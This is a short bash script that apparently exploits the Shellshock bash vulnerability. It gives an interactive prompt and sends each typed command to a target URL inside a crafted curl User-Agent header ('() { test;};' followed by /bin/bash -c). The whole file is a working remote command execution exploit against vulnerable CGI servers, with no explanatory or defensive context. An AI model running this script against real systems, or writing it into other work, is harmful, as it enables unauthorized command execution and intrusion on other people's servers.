#!/bin/bash

target=$1

while true
do
	read -p ">> " command
	if [ $command = 'clear' ];
	then
		clear
	fi
	curl -A "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/bash -c \"$command\"" $target
done
